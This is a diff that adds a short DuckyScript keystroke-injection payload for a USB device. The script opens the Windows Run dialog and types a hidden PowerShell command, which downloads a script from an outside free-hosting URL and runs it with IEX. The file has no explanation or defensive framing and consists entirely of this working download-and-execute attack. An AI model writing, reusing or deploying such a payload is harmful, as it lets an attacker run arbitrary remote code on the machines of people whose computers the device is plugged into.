@@ -1,0 +1,4 @@
+GUI r
+DELAY 300
+STRING powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://ailing-presents.000webhostapp.com/');"
+ENTER
